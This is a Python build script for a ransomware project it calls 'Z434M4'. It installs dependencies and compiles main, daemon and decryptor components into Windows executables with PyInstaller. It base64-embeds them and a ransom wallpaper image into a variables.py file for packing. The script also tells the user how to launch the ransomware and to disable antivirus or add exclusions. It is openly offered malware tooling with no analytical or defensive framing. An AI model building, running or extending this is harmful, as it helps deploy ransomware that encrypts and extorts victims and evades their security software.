#!/usr/bin/env python

import argparse
import base64
import os
import sys
import shutil
import subprocess

"""
parser = argparse.ArgumentParser(description='Build Z434M4.', add_help=True)
parser.add_argument('-i', '--ip', type=str, required=True, metavar='[FILE]',
    help='Ip address of the server. Z434M4 will try to connect to')
parser.add_argument('-p', '--port', type=str, required=False, metavar='[FILE]',
    help='Port of the server.')
parser.add_argument('-I', '--img', type=str, required=False, metavar='[FILE]',
    help='Img to change wallpaper and display on Z434M4 execution.')
args = parser.parse_args()
"""


def error(s):
    print(s)
    sys.exit(-1)


def install_requirements():
    """Install all required packages for the ransomware to work"""
    print("Installing required packages...")
    required_packages = [
        "pyinstaller",
        "cryptography",
        "requests",
        "pillow",  # For wallpaper manipulation
    ]
    
    for package in required_packages:
        print(f"Installing {package}...")
        try:
            # Use python -m pip to ensure we're using the correct pip
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", package],
                capture_output=True,
                text=True,
                check=True
            )
            print(f"Successfully installed {package}")
        except subprocess.CalledProcessError as e:
            print(f"Error installing {package}: {e}")
            print(f"STDOUT: {e.stdout}")
            print(f"STDERR: {e.stderr}")
            response = input(f"Continue despite {package} installation failure? (y/n): ")
            if response.lower() != 'y':
                sys.exit(1)


def build(program):
    # Use os.path.join for Windows path compatibility
    ransomware_dir = os.path.join(os.getcwd(), "Ransomware")
    script_path = os.path.join(ransomware_dir, f"{program}.py")
    project_dir = os.getcwd()
    
    if not os.path.exists(script_path):
        error(f"Script {script_path} not found")
    
    # Use Python to call PyInstaller as a module instead of direct command
    print(f"Building {program}...")
    try:
        pyinstaller_args = [
            sys.executable, 
            "-m", 
            "PyInstaller", 
            "-F", 
            "--clean", 
            script_path, 
            "-n", 
            program,
            "--distpath", 
            project_dir
        ]
        result = subprocess.run(
            pyinstaller_args,
            check=True,
            capture_output=True,
            text=True
        )
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"PyInstaller error: {e}")
        print(f"STDOUT: {e.stdout}")
        print(f"STDERR: {e.stderr}")
        error(f"Failed to build {program}")

    # Read the binary data with updated path (now in project root)
    exe_path = os.path.join(project_dir, f"{program}.exe")
    try:
        with open(exe_path, 'rb') as f:
            binary_data = f.read()
            output64 = base64.b64encode(binary_data)
    except Exception as e:
        error(f'{program} binary doesn\'t exist, compilation failed: {str(e)}')

    # Write base64 data to project directory
    output_path = os.path.join(project_dir, f"base64{program}")
    with open(output_path, 'wb') as f:
        f.write(output64)
    
    print(f"Successfully built {program}")
    return output64


def build_Z434M4():
    print("Building Z434M4 ransomware...")
    return build('main')  # Using main.py for the main ransomware component


def build_decryptor():
    print("Building decryptor...")
    return build('decryptor')


def build_daemon():
    print("Building daemon...")
    return build('daemon')

def encode_image_to_base64(image_path=None):
    """Encode image to base64 and update variables.py"""
    print("Encoding image to base64...")
    
    # If no image path specified, look in standard locations
    if not image_path:
        possible_paths = [
            os.path.join(os.getcwd(), "Ransomware", "img.png"),
            os.path.join(os.getcwd(), "img.png"),
            os.path.join(os.path.dirname(os.getcwd()), "img.png")
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                image_path = path
                print(f"Found image at: {image_path}")
                break
    
    if not image_path or not os.path.exists(image_path):
        print("No image file found. Wallpaper change feature will not work.")
        return None
    
    # Read the image file and encode to base64
    try:
        with open(image_path, "rb") as image_file:
            encoded_string = base64.b64encode(image_file.read())
            return encoded_string
    except Exception as e:
        print(f"Error encoding image: {str(e)}")
        return None

def update_variables_file():
    """Update variables.py with base64 encoded executables"""
    print("Updating variables.py with base64 encoded executables...")
    variables_path = os.path.join(os.getcwd(), "Ransomware", "variables.py")
    
    if not os.path.exists(variables_path):
        error("variables.py not found")
    
    # Read the base64 encoded files
    try:
        with open("base64main", "rb") as f:
            main_base64 = f.read().decode('utf-8')
        
        with open("base64daemon", "rb") as f:
            daemon_base64 = f.read().decode('utf-8')
            
        with open("base64decryptor", "rb") as f:
            decryptor_base64 = f.read().decode('utf-8')
    except Exception as e:
        error(f"Could not read base64 files: {str(e)}")
    
    # Encode image to base64
    img_base64 = encode_image_to_base64()

    # Read the variables file
    with open(variables_path, "r") as f:
        content = f.readlines()
    
    # Update the variables
    for i, line in enumerate(content):
        if line.startswith("Z434M4 ="):
            content[i] = f'Z434M4 = b"""{main_base64}"""\n'
        elif line.startswith("decryptor ="):
            content[i] = f'decryptor = b"""{decryptor_base64}"""\n'
        elif line.startswith("daemon ="):
            content[i] = f'daemon = b"""{daemon_base64}"""\n'
        elif line.startswith("img =") and img_base64:
            content[i] = f'img = b"""{img_base64.decode("utf-8")}"""\n'
    
    # Write back to the file
    with open(variables_path, "w") as f:
        f.writelines(content)
    
    print("Successfully updated variables.py")


def clean_dist():
    """Clean build artifacts"""
    print("Cleaning build artifacts...")
    # Remove PyInstaller build artifacts but keep the executables
    directories_to_clean = ['build', '__pycache__']
    files_to_clean = [f for f in os.listdir() if f.endswith('.spec')]
    
    for directory in directories_to_clean:
        if os.path.exists(directory):
            try:
                shutil.rmtree(directory)
                print(f"Removed {directory}")
            except Exception as e:
                print(f"Error removing {directory}: {str(e)}")
    
    for file in files_to_clean:
        try:
            os.remove(file)
            print(f"Removed {file}")
        except Exception as e:
            print(f"Error removing {file}: {str(e)}")


def main():
    # First install all required packages
    install_requirements()
    
    # Build each component
    decryptor64 = build_decryptor()
    daemon64 = build_daemon()
    Z434M4_64 = build_Z434M4()
    
    # Update variables.py with the base64 encoded executables
    update_variables_file()
    
    print("\nBuild process complete!")
    print("--------------------------------------")
    print("The following files were created:")
    print("- main.exe - Main ransomware executable")
    print("- daemon.exe - Background process executable")
    print("- decryptor.exe - Decryption tool executable")
    print("- base64main - Base64 encoded main binary")
    print("- base64daemon - Base64 encoded daemon binary")
    print("- base64decryptor - Base64 encoded decryptor binary")
    print("--------------------------------------")
    print("variables.py has been updated with base64 encoded binaries")
    print("\nTo run the ransomware: main.exe")
    print("Note: You may need to disable antivirus or add exclusions for these files")


if __name__ == '__main__':
    main()
    # Clean up build artifacts
    clean_dist()